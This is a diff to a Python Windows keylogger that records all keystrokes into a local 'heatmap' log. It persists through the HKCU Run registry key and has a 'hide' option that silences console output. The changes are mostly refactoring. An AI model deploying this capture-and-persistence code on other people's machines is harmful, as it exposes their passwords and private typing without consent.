@@ -1,4 +1,5 @@
 import keyboard
+from keyboard import KeyboardEvent
 import win32api
 import win32event
 import win32console
@@ -8,7 +9,6 @@ import json
 import os
 from os.path import exists, join
 import sys
-import time
 from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
 
 # Folder where the pages of your book get logged
@@ -33,7 +33,9 @@ paused = False
 # Read confgi from json file
 def read_config():
     config_path = join(DIR_PATH, CONFIG_FILE)
+    # Check file exist and is not empty
     if exists(config_path) and not os.stat(config_path).st_size == 0:
+        # Open file and read config 
         with open(config_path, "r") as read_file:
             global config
             config = json.load(read_file)
@@ -44,7 +46,7 @@ def read_config():
 # Read the configurarion
 read_config()
 
-# Disallowing multiple instances
+# Disallowing multiple instances with same prefix
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + config["file-prefix"])
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
@@ -56,41 +58,39 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 def add_to_startup():
     global config
     key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
     key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
-
-    reg_value_prefix = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' '
-    reg_value_postfix = '"'
-
-    reg_value = reg_value_prefix + '"' + CURRENT_FILE_PATH + reg_value_postfix
+    reg_value = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' ' + '"' + CURRENT_FILE_PATH + '"'
 
     try:
         SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
     except Exception as e:
-        if config["output"] == 'debug':
+        if not config["hide"]:
             print(e)
 
-# Remove from startup f
+# Remove from startup 
 def remove_from_startup():
     key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
     key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
 
     try:
         DeleteValue(key2change, LOGGER_NAME)  
     except Exception as e:
-        if config["output"] == 'debug':
+        if not config["hide"]:
             print(e, ". Not critical if logger isn't applied to startup")
 
 # Debug logger
 def log_debug():
     global config, heatmap_buffer
     if len(heatmap_order) > 0:
+            # Print the last pressed key to console
             if len(heatmap_order[-1]["key"]) == 1:
                 print(heatmap_buffer[heatmap_order[-1]["key"][0]])
-            if len(heatmap_order[-1]["key"]) == 2:
+                return True
+            # Print the last pressed keycombinaiton to console
+            elif len(heatmap_order[-1]["key"]) == 2:
                 print(heatmap_buffer[heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1]])
     return True
+    return False
 
 # Append file with pressed keys
 def log_local():
@@ -118,15 +118,16 @@ def log_local():
 def log_it():
     global config
     if config["output"] == "local":        
-        log_local()
+        return log_local()
     elif config["output"] == "debug":
-        log_debug()
-    return True
+        return log_debug()
+    return False
     
-def key_callback(event):
+def key_callback(event: KeyboardEvent):
     global heatmap_buffer, heatmap_order, paused
 
-    now_ms = round(time.time_ns() / 1000000)
+    # Current time when key is pressed
+    now_ms = round(event.time * 1000)
 
     # while paused no logging
     if paused:
@@ -168,13 +169,10 @@ def key_callback(event):
             if len(heatmap_order) > 0:
                 if len(heatmap_order[-1]["key"]) == 1:
                     heatmap_buffer[heatmap_order[-1]["key"][0]]["mentions"] = heatmap_buffer[heatmap_order[-1]["key"][0]]["mentions"] - 1
-                    # heatmap_order.pop()
                 elif len(heatmap_order[-1]["key"]) == 2:
                     heatmap_buffer[heatmap_order[-1]["key"][-1]]["mentions"] = heatmap_buffer[heatmap_order[-1]["key"][-1]]["mentions"] - 1
                     heatmap_buffer[(heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1])]["mentions"] = heatmap_buffer[(heatmap_order[-1]["key"][0] + heatmap_order[-1]["key"][1])]["mentions"] - 1
-                    # heatmap_order[-1]["key"] = [heatmap_order[-1]["key"][0]]
                 heatmap_order.pop()
-                
     # Letters
     elif len(event.name) == 1:
         key_pressed = {
@@ -258,8 +256,9 @@ def main():
     keyboard.add_hotkey(config["hotkeys"]["save-hotkey"], log_local)
     # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
     keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
-    log_it()
-    if not config["hide"] or (config["output"] == 'debug'):
+    if not log_it() and not config["hide"]:
+        print("Something went wrong while saving!")
+    if not config["hide"]:
         print(LOGGER_NAME + " stopped.")
     exit()
 
